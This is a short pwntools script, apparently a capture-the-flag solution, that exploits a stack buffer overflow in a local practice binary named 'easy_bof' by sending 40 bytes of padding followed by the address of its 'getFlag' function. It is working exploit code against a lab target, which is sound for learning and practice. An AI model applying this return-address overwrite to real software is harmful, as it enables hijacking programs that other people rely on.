from pwn import*

elf=ELF("./easy_bof")
p=process("./easy_bof")
garbage=b'A'*(16+24)
addres=p64(elf.symbols["getFlag"])
p.sendline(garbage+addres)
msg=p.recvall()
print(msg)